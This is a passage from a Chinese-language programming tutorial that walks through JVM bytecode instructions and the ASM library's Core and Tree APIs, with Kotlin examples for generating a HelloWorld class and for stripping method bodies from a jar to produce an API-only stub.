punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre><code>Code:  stack=3, locals=3, args_size=1     0: iconst_1     1: istore_1     2: iconst_2     3: iload_1     4: iadd     5: istore_2     6: getstatic     #2                  // Field java/lang/System.out:Ljava/io/PrintStream;     9: iload_1    10: iload_2    11: invokestatic  #3                  // Method sum:(II)I    14: invokevirtual #4                  // Method java/io/PrintStream.println:(I)V    17: return</code></pre><hr><blockquote><p>iconst_1</p></blockquote><p>将一个int类型的常量<code>1</code>加载到<strong>操作数栈</strong>, 此时操作数栈深度为1。对应<code>int a = 1</code>中1的初始化。</p><blockquote><p>istore_1</p></blockquote><p>将一个int类型的数值从<strong>操作数栈</strong>顶取出并存储到局部变量表，这个数值在操作数栈的位置为1，即我们刚才压进操作数栈的<code>1</code>，对应<code>int a = 1</code>中的赋值操作</p><blockquote><p>iconst_2</p></blockquote><p>将一个int类型的常量<code>2</code>加载到<strong>操作数栈</strong>，此时操作数栈深度为2。对应 <code>int b = 2 + a</code>中2的初始化</p><blockquote><p>iload_1</p></blockquote><p>将一个int类型的局部变量直接加载到<strong>操作数栈</strong>，这个局部变量在局部变量表的位置为1。即刚才第二条指令存进局部变量表的局部变量<code>a</code></p><blockquote><p>iadd</p></blockquote><p>将<strong>操作数栈</strong>顶的两个int类型的数值取出并相加，再压进<strong>操作数栈</strong>中，对应<code>int b = 2 + a</code>的加法运算</p><blockquote><p>istore_2</p></blockquote><p>将一个int类型的数值从<strong>操作数栈</strong>顶中取出并存储到局部变量表，这个数值在<strong>操作数栈</strong>的位置为2，对应<code>int b = 2 + a</code>的赋值</p><blockquote><p>getstatic     #2                  // Field java/lang/System.out:Ljava/io/PrintStream;</p></blockquote><p>获取静态域<code>System.out</code>, 类型为<code>Ljava/io/PrintStream</code>,并将其压入<strong>操作数栈</strong>顶。后面跟的<code>#2</code>在常量池中对应<code>Field java/lang/System.out:Ljava/io/PrintStream;</code></p><blockquote><p>iload_1</p></blockquote><p>将int类型的局部变量<code>a</code>加载到<strong>操作数栈</strong>，待用</p><blockquote><p>iload_2</p></blockquote><p>将int类型的局部变量b加载到<strong>操作数栈</strong>，待用</p><blockquote><p>invokestatic  #3                  // Method sum:(II)I</p></blockquote><p>执行所在类中的静态方法，传入栈顶的两个int数值作为形参，返回一个int类型的值压入栈顶</p><blockquote><p>invokevirtual #4                  // Method java/io/PrintStream.println:(I)V</p></blockquote><p>执行<code>PrintStream#println</code>方法，传入栈顶元素作为参数，再传入下一个栈顶元素作为receiver（不知道java这个叫什么，反正kotlin有receiver这个概念）</p><blockquote><p>return</p></blockquote><p>返回void</p><hr><p>经过上面的分析我们已经大致知道了某些字节码的功能，你肯定也发现了，很大一部分字节码的功能是基于<strong>操作数栈</strong>实现的。</p><p>特别是基于栈的数学运算，挺有意思的，我记得我们上学期有一次红岩作业就是实现一个逻辑运算，当时去网上看了一下，要用逆波兰表达式的解析方式配合栈来实现，这应该也是jvm数学运算的实现方式吧，有兴趣可以再写一遍。</p><p>这里我就不系统性的讲解字节码指令了，太多了，根本讲不完。但你们可以课下去了解，我一般是遇见不认识的然后再去查:)</p><h3 id="ASM框架"><a href="#ASM框架" class="headerlink" title="ASM框架"></a>ASM框架</h3><p>前面我们学习了字节码的基本结构以及部分字节码指令，我们一般使用ASM/Javassist/cglib等字节码操控框架来动态的修改/生成字节码。那么通过它们我们能做到什么事情呢?</p><ul><li>编译期代码生成/替换 ，一般通过gradle插件干预编译实现（例如著名的gradle插件shadowJar的依赖包重定向(relocate)功能)。字节码插桩也是在这个过程进行。</li><li>运行期动态代理，可以做到一些InvocationHandler做不到的事情，例如修改类中包引用的包名。</li><li>在获取一些类的信息时，使用asm读取字节码比反射要快得多。</li><li>使用jvm一些奇奇怪怪的特性，例如<a href="https://github.com/MeiVinEight/ReflectionFX">MeiVinEight/ReflectionFX: Reflection Toolkit (github.com)</a>，该项目利用字节码的一些乱七八糟的特性实现了性能开销更小的反射，其性能甚至能够与操作MethodHandle持平。</li></ul><p>其实应该还有很多，我就不列举了。</p><p>这里可能有人有疑问，我们android不是编译成dex吗，那按照常规的方式操作字节码是可行的吗？答案是可行，因为我们字节码插桩的过程一般是</p><p>这里我主要介绍asm框架，它是最流行，最直接的操作字节码的框架，jdk甚至内置了一份。如果从学习字节码的角度来看，asm无疑是最合适的选择。同时安卓中用得比较多的技术就是字节码插桩，所以我准备讲一讲如何用asm框架实现字节码插桩。</p><h4 id="ASM-Core-API-amp-Tree-API"><a href="#ASM-Core-API-amp-Tree-API" class="headerlink" title="ASM Core API &amp; Tree API"></a>ASM Core API &amp; Tree API</h4><h5 id="Core-API"><a href="#Core-API" class="headerlink" title="Core API"></a>Core API</h5><p>ASM 是基于访问者模式设计的，访问者模式可以让ASM更好的操作某个Jar包/class文件中的所有类/字段/方法。因此要学会ASM，首先必须要了解访问者模式。(我其实懵逼了很久) 如果你们以后有兴趣了解kapt/ksp也会用到访问者模式。（实际上这俩很多时候是跟asm配合着用的, kapt/ksp生成代码，asm对代码进行插桩调用）</p><p><a href="https://www.runoob.com/design-pattern/visitor-pattern.html">访问者模式 | 菜鸟教程 (runoob.com)</a></p><p>现在我们来讲讲基础用法:</p><p>ASM基于访问者模式，为我们提供了一套访问class文件中所有属性的API。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">ClassVisitor</span> <span class="token punctuation">{</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">visit</span><span class="token punctuation">(</span><span class="token keyword">int</span> version<span class="token punctuation">,</span> <span class="token keyword">int</span> access<span class="token punctuation">,</span> <span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token class-name">String</span> signature<span class="token punctuation">,</span> <span class="token class-name">String</span> superName<span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> interfaces<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//访问类字段时回调</span>    <span class="token keyword">public</span> <span class="token class-name">FieldVisitor</span> <span class="token function">visitField</span><span class="token punctuation">(</span><span class="token keyword">int</span> access<span class="token punctuation">,</span> <span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token class-name">String</span> desc<span class="token punctuation">,</span> <span class="token class-name">String</span> signature<span class="token punctuation">,</span> <span class="token class-name">Object</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//访问类方法是回调</span>    <span class="token keyword">public</span> <span class="token class-name">MethodVisitor</span> <span class="token function">visitMethod</span><span class="token punctuation">(</span><span class="token keyword">int</span> access<span class="token punctuation">,</span> <span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token class-name">String</span> desc<span class="token punctuation">,</span> <span class="token class-name">String</span> signature<span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> exceptions<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">visitEnd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在使用ClassVisitor访问类时，一旦访问到其中的属性就会回调到对应的属性的访问方法。</p><blockquote><h6 id="1：void-visit-int-version-int-access-String-name-String-signature-String-superName-String-interfaces"><a href="#1：void-visit-int-version-int-access-String-name-String-signature-String-superName-String-interfaces" class="headerlink" title="1：void visit(int version, int access, String name, String signature, String superName, String[] interfaces)"></a>1：void visit(int version, int access, String name, String signature, String superName, String[] interfaces)</h6><p>访问class的头信息</p><p>version：class版本（编译级别）</p><p>access： 访问标示</p><p>name：类名称</p><p>signature：class的签名，可能是null</p><p>superName：超类名称</p><p>interfaces：接口的名称</p><h6 id="2：void-visitAnnotation-String-descriptor-boolean-visible"><a href="#2：void-visitAnnotation-String-descriptor-boolean-visible" class="headerlink" title="2：void visitAnnotation(String descriptor, boolean visible)"></a>2：void visitAnnotation(String descriptor, boolean visible)</h6><p>访问class的注解信息</p><p>descriptor：描述信息</p><p>visible：是否运行时可见</p><h6 id="3：FieldVisitor-visitField-int-access-String-name-String-descriptor-String-signature-Object-value"><a href="#3：FieldVisitor-visitField-int-access-String-name-String-descriptor-String-signature-Object-value" class="headerlink" title="3：FieldVisitor visitField(int access, String name,String descriptor, String signature,Object value)"></a>3：FieldVisitor visitField(int access, String name,String descriptor, String signature,Object value)</h6><p>访问class中字段的信息，返回一个FieldVisitor用于获取字段中更加详细的信息。</p><p>name：字段个的名称</p><p>descriptor：字段的描述</p><p>value：该字段的初始值，文档上面说：</p><p>该参数，其可以是零，如果字段不具有初始值，必须是一个<code>Integer</code>，一<code>Float</code>，一<code>Long</code>，一个<code>Double</code>或一个<code>String</code>（对于<code>int</code>，<code>float</code>，<code>long</code> 或<code>String</code>分别字段）。<em>此参数仅用于静态字段</em>。对于非静态字段，它的值被忽略，非静态字段必须通过构造函数或方法中的字节码指令进行初始化（但是不管我怎么试，结果都是null）。</p><h6 id="4：MethodVisitor-visitMethod-int-access-String-name-String-descriptor-String-signature-String-exceptions"><a href="#4：MethodVisitor-visitMethod-int-access-String-name-String-descriptor-String-signature-String-exceptions" class="headerlink" title="4：MethodVisitor visitMethod(int access,String name,String descriptor,String signature, String[] exceptions)"></a>4：MethodVisitor visitMethod(int access,String name,String descriptor,String signature, String[] exceptions)</h6><p>访问class中方法的信息，返回一个MethodVisitor用于获取方法中更加详细的信息。</p><p>name：方法的名称</p><p>descriptor：方法的描述</p><p>signature：方法的签名</p><p>exceptions：方法的异常名称</p><h6 id="5：visitInnerClass-String-name-String-outerName-String-innerName-int-access"><a href="#5：visitInnerClass-String-name-String-outerName-String-innerName-int-access" class="headerlink" title="5：visitInnerClass(String name, String outerName, String innerName, int access)"></a>5：visitInnerClass(String name, String outerName, String innerName, int access)</h6><p>访问class中内部类的信息。这个内部类不一定是被访问类的成员（这里的意思是可能是一段方法中的<strong>匿名内部类</strong>，或者<strong>声明在一个方法中的类</strong>等等）。</p><p>name：内部类的名称。例子<code>com/hebaibai/example/demo/Aoo$1XX</code></p><p>outerName：内部类所在类的名称</p><p>innerName：内部类的名称</p><h6 id="6：visitOuterClass-String-owner-String-name-String-descriptor"><a href="#6：visitOuterClass-String-owner-String-name-String-descriptor" class="headerlink" title="6：visitOuterClass(String owner, String name, String descriptor)"></a>6：visitOuterClass(String owner, String name, String descriptor)</h6><p>访问该类的封闭类。仅当类具有封闭类时，才必须调用此方法。</p><p>我自己试了一下，如果在一个方法中定义了一个class，或者定义个一个匿名内部类，这时通过visitInnerClass方法能够得到例如<code>com/hebaibai/example/demo/Aoo$1</code>或者<code>com/hebaibai/example/demo/Aoo$1XX</code>的类名称。这时通过使用</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">ClassReader classReader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ClassReader</span><span class="token punctuation">(</span><span class="token string">"com/hebaibai/example/demo/Aoo$1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> classReader<span class="token punctuation">.</span><span class="token function">accept</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">DemoClassVisitor</span><span class="token punctuation">(</span>Opcodes<span class="token punctuation">.</span><span class="token constant">ASM7</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ClassReader<span class="token punctuation">.</span><span class="token constant">SKIP_CODE</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>复制</p><p>可以得到持有内部类的类信息。</p><p>owner：拥有该类的class名称</p><p>name：包含该类的方法的名称，如果该类未包含在其封闭类的方法中，则返回null</p><p>descriptor：描述</p></blockquote><p>ClassVisitor是一个抽象类，我们可以通过继承它来实现自己的ClassVisitor（MethodVistitor/FieldVisitor同)。我们可以插入一段逻辑来获取我们要访问的类的信息，也可以通过改变方法的返回值来修改类的信息。</p><p>当然我们也可以直接通过ClassWriter来生成一个类，手动调用它的各种visit方法来向生成的类来写入字节码，下面我们先简简单单写个HelloWorld。</p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token keyword">fun</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">val</span> classWriter <span class="token operator">=</span> <span class="token function">ClassWriter</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    classWriter<span class="token punctuation">.</span><span class="token function">visit</span><span class="token punctuation">(</span>        V1_8<span class="token punctuation">,</span>        ACC_PUBLIC <span class="token operator">+</span> ACC_SUPER<span class="token punctuation">,</span>        <span class="token string">"org/example/asmlearn/ASMLearn_Test"</span><span class="token punctuation">,</span>        <span class="token keyword">null</span><span class="token punctuation">,</span>        <span class="token string">"java/lang/Object"</span><span class="token punctuation">,</span>        <span class="token keyword">null</span>    <span class="token punctuation">)</span>    <span class="token keyword">val</span> mv <span class="token operator">=</span> classWriter<span class="token punctuation">.</span><span class="token function">visitMethod</span><span class="token punctuation">(</span>        ACC_PUBLIC <span class="token operator">+</span> ACC_STATIC<span class="token punctuation">,</span>        <span class="token string">"main"</span><span class="token punctuation">,</span>        <span class="token string">"([Ljava/lang/String;)V"</span><span class="token punctuation">,</span>        <span class="token keyword">null</span><span class="token punctuation">,</span>        <span class="token keyword">null</span>    <span class="token punctuation">)</span>    mv<span class="token punctuation">.</span><span class="token function">visitFieldInsn</span><span class="token punctuation">(</span>GETSTATIC<span class="token punctuation">,</span> <span class="token string">"java/lang/System"</span><span class="token punctuation">,</span> <span class="token string">"out"</span><span class="token punctuation">,</span> <span class="token string">"Ljava/io/PrintStream;"</span><span class="token punctuation">)</span>    mv<span class="token punctuation">.</span><span class="token function">visitLdcInsn</span><span class="token punctuation">(</span><span class="token string">"Hello, World!"</span><span class="token punctuation">)</span>    mv<span class="token punctuation">.</span><span class="token function">visitMethodInsn</span><span class="token punctuation">(</span>INVOKEVIRTUAL<span class="token punctuation">,</span> <span class="token string">"java/io/PrintStream"</span><span class="token punctuation">,</span> <span class="token string">"println"</span><span class="token punctuation">,</span> <span class="token string">"(Ljava/lang/String;)V"</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span>    mv<span class="token punctuation">.</span><span class="token function">visitInsn</span><span class="token punctuation">(</span>RETURN<span class="token punctuation">)</span>    mv<span class="token punctuation">.</span><span class="token function">visitMaxs</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>    mv<span class="token punctuation">.</span><span class="token function">visitEnd</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    classWriter<span class="token punctuation">.</span><span class="token function">visitEnd</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">val</span> byteArray <span class="token operator">=</span> classWriter<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">val</span> classLoader <span class="token operator">=</span> <span class="token function">MyClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">val</span> clazz <span class="token operator">=</span> classLoader<span class="token punctuation">.</span><span class="token function">defineClass</span><span class="token punctuation">(</span><span class="token string">"org.example.asmlearn.ASMLearn_Test"</span><span class="token punctuation">,</span> byteArray<span class="token punctuation">)</span>    <span class="token keyword">val</span> m <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"main"</span><span class="token punctuation">,</span> Array<span class="token operator">&lt;</span>String<span class="token operator">&gt;</span><span class="token operator">::</span><span class="token keyword">class</span><span class="token punctuation">.</span>java<span class="token punctuation">)</span>    m<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token function">arrayOf</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">class</span> MyClassLoader <span class="token operator">:</span> <span class="token function">ClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">fun</span> <span class="token function">defineClass</span><span class="token punctuation">(</span>name<span class="token operator">:</span> String<span class="token punctuation">,</span> b<span class="token operator">:</span> ByteArray<span class="token punctuation">)</span><span class="token operator">:</span> Class<span class="token operator">&lt;</span><span class="token operator">*</span><span class="token operator">&gt;</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">defineClass</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> b<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> b<span class="token punctuation">.</span>size<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里我们通过asm生成了一个<code>org/example/asmlearn/ASMLearn_Test</code>类，并在里面生成了一个main方法，加载到自定义的classLoader中，然后对它进行反射执行main方法。</p><blockquote><p> 顺便说下生成代码的事情，编译期生成常规代码其实不推荐使用asm，我们一般只在运行期动态生成代码才使用asm。因为asm写起来比较繁琐，运行期用它来生成代码其实是因为没有更好的办法了。编译期如果不是你想实现什么魔法的话一般不用来生成代码，生成代码可以了解一下kapt和ksp，编译期asm一般只是用来在已有的代码中进行插桩。</p></blockquote><h5 id="Tree-API"><a href="#Tree-API" class="headerlink" title="Tree API"></a>Tree API</h5><p>Tree API基于Core API实现，Tree API让我们不用再自定义Visitor，我们可以直接获取一个类的ClassNode，然后通过ClassNode直接获得里面所有的方法/字段信息。</p><p>那么我们要如何得到一个ClassNode呢？</p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token keyword">fun</span> <span class="token function">getClassNode</span><span class="token punctuation">(</span>clazzFile<span class="token operator">:</span> File<span class="token punctuation">)</span><span class="token operator">:</span> ClassNode <span class="token punctuation">{</span>    <span class="token keyword">val</span> classReader <span class="token operator">=</span> <span class="token function">ClassReader</span><span class="token punctuation">(</span>clazzFile<span class="token punctuation">.</span><span class="token function">inputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">val</span> classNode <span class="token operator">=</span> <span class="token function">ClassWriter</span><span class="token punctuation">(</span>ASM9<span class="token punctuation">)</span>    classReader<span class="token punctuation">.</span><span class="token function">accept</span><span class="token punctuation">(</span>classNode<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> classNode<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们可以发现，其实ClassNode就是一个封装过的ClassVisitor。它重写了ClassVisitor所有的访问方法，在访问时把访问到的信息存到类中，然后我们就可以直接从里面获取。<em><strong>有兴趣可以自己实现一下ClassNode，非常简单。</strong></em></p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token keyword">val</span> classNode <span class="token operator">=</span> <span class="token function">getClassNode</span><span class="token punctuation">(</span>clazzFile<span class="token punctuation">)</span><span class="token comment">// 获取所有方法信息</span><span class="token keyword">val</span> methods<span class="token operator">:</span> List<span class="token operator">&lt;</span>MethodNode<span class="token operator">&gt;</span> <span class="token operator">=</span> classNode<span class="token punctuation">.</span>methods<span class="token comment">// 获取所有字段信息</span><span class="token keyword">val</span> fields<span class="token operator">:</span> List<span class="token operator">&lt;</span>FieldNode<span class="token operator">&gt;</span> <span class="token operator">=</span> classNode<span class="token punctuation">.</span>fields<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h4><p>接下来我会讲解一些asm框架的实战用例，大家有兴趣回去可以跟着敲一敲，都不难。</p><p>推荐的参考资料<a href="https://www.bilibili.com/read/cv13433468">Java ASM详解：MethodVisitor和Opcode（二）类型、数组、字段、方法、异常与同步 - 哔哩哔哩 (bilibili.com)</a></p><p>写的时候跟字节码和这个资料对照着看。</p><h5 id="ApiJarGenerator"><a href="#ApiJarGenerator" class="headerlink" title="ApiJarGenerator"></a>ApiJarGenerator</h5><blockquote><p>写这个实战的时候我还只知道Core API，所以以下功能均使用Core API实现</p></blockquote><blockquote><p>我们知道，Java的类文件都是可以反编译的，同时如果要依赖于某个Jar进行开发就必须要有Jar文件。</p><p>设想一种情况，我们开发项目人手不够，去找了外包。同时我们有一份自主开发的框架/类库，但我们不希望这份库的Jar文件落入外包者之手，但项目开发必须要依赖这份Jar文件，否则就通不过编译，怎么办呢？</p><p>了解了asm框架与JVM字节码结构后我们很容易就能想出一个解决方案，删空Jar文件中所有方法的字节码指令，只留下可供调用的方法声明。这样外包者就无法通过反编译得知方法的具体逻辑，但外包者仍然能调用其中的公开方法，并且项目也能通过编译。</p></blockquote><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token comment">/** * org.example.asmlearn.ApiJarGenerator * asm-learn * * @author 寒雨 * @since 2022/7/11 14:22 */</span><span class="token keyword">fun</span> <span class="token function">generate</span><span class="token punctuation">(</span>sourceJar<span class="token operator">:</span> File<span class="token punctuation">,</span> output<span class="token operator">:</span> File<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>output<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        output<span class="token punctuation">.</span><span class="token function">createNewFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token function">JarOutputStream</span><span class="token punctuation">(</span>output<span class="token punctuation">.</span><span class="token function">outputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">use</span> <span class="token punctuation">{</span> <span class="token keyword">out</span> <span class="token operator">-&gt;</span>        <span class="token function">JarFile</span><span class="token punctuation">(</span>sourceJar<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">use</span> <span class="token punctuation">{</span> jarFile <span class="token operator">-&gt;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>jarEntry <span class="token keyword">in</span> jarFile<span class="token punctuation">.</span><span class="token function">entries</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                jarFile<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span>jarEntry<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">use</span> <span class="token punctuation">{</span> input <span class="token operator">-&gt;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>jarEntry<span class="token punctuation">.</span>name<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">".class"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token comment">// 如果是class文件，就用我们自定义的ClassVisitor visit它</span>                        <span class="token keyword">val</span> classReader <span class="token operator">=</span> <span class="token function">ClassReader</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span>                        <span class="token keyword">val</span> classWriter <span class="token operator">=</span> <span class="token function">ClassWriter</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                        <span class="token keyword">val</span> visitor <span class="token operator">=</span> <span class="token function">EmptyClassVisitor</span><span class="token punctuation">(</span>classWriter<span class="token punctuation">)</span>                        classReader<span class="token punctuation">.</span><span class="token function">accept</span><span class="token punctuation">(</span>visitor<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>                        <span class="token keyword">out</span><span class="token punctuation">.</span><span class="token function">putNextEntry</span><span class="token punctuation">(</span><span class="token function">JarEntry</span><span class="token punctuation">(</span>jarEntry<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span>                        <span class="token comment">// 写入class文件</span>                        <span class="token keyword">out</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>classWriter<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                        <span class="token keyword">out</span><span class="token punctuation">.</span><span class="token function">putNextEntry</span><span class="token punctuation">(</span><span class="token function">JarEntry</span><span class="token punctuation">(</span>jarEntry<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span>                        input<span class="token punctuation">.</span><span class="token function">copyTo</span><span class="token punctuation">(</span><span class="token keyword">out</span><span class="token punctuation">)</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token function">EmptyClassVisitor</span><span class="token punctuation">(</span>visitor<span class="token operator">:</span> ClassVisitor<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token function">ClassVisitor</span><span class="token punctuation">(</span>ASM9<span class="token punctuation">,</span> visitor<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">visitMethod</span><span class="token punctuation">(</span>        access<span class="token operator">:</span> Int<span class="token punctuation">,</span>        name<span class="token operator">:</span> String<span class="token operator">?</span><span class="token punctuation">,</span>        descriptor<span class="token operator">:</span> String<span class="token operator">?</span><span class="token punctuation">,</span>        signature<span class="token operator">:</span> String<span class="token operator">?</span><span class="token punctuation">,</span>        exceptions<span class="token operator">:</span> Array<span class="token operator">&lt;</span><span class="token keyword">out</span> String<span class="token operator">&gt;</span><span class="token operator">?</span>    <span class="token punctuation">)</span><span class="token operator">:</span> MethodVisitor <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">EmptyMethodVisitor</span><span class="token punctuation">(</span><span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">visitMethod</span><span class="token punctuation">(</span>access<span class="token punctuation">,</span> name<span class="token punctuation">,</span> descriptor<span class="token punctuation">,</span> signature<span class="token punctuation">,</span> exceptions<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token function">EmptyMethodVisitor</span><span class="token punctuation">(</span>methodVisitor<span class="token operator">:</span> MethodVisitor<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token function">MethodVisitor</span><span class="token punctuation">(</span>ASM9<span class="token punctuation">,</span> methodVisitor<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">visitIincInsn</span><span class="token punctuation">(</span>`<span class="token keyword">var</span>`<span class="token operator">:</span> Int<span class="token punctuation">,</span> increment<span class="token operator">:</span> Int<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">visitInsn</span><span class="token punctuation">(</span>opcode<span class="token operator">:</span> Int<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">visitIntInsn</span><span class="token punctuation">(</span>opcode<span class="token operator">:</span> Int<span class="token punctuation">,</span> operand<span class="token operator">:</span> Int<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">visitVarInsn</span><span class="token punctuation">(</span>opcode<span class="token operator">:</span> Int<span class="token punctuation">,</span> `<span class="token keyword">var</span>`<span class="token operator">:</span> Int<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">visitTypeInsn</span><span class="token punctuation">(</span>opcode<span class="token operator">:</span> Int<span class="token punctuation">,</span> type<span class="token operator">:</span> String<span class="token operator">?</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">visitJumpInsn</span><span class="token punctuation">(</span>opcode<span class="token operator">:</span> Int<span class="token punctuation">,</span> label<span class="token operator">:</span> Label<span class="token operator">?</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">visitLabel</span><span class="token punctuation">(</span>label<span class="token operator">:</span> Label<span class="token operator">?</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">visitLdcInsn</span><span class="token punctuation">(</span>value<span class="token operator">:</span> Any<span class="token 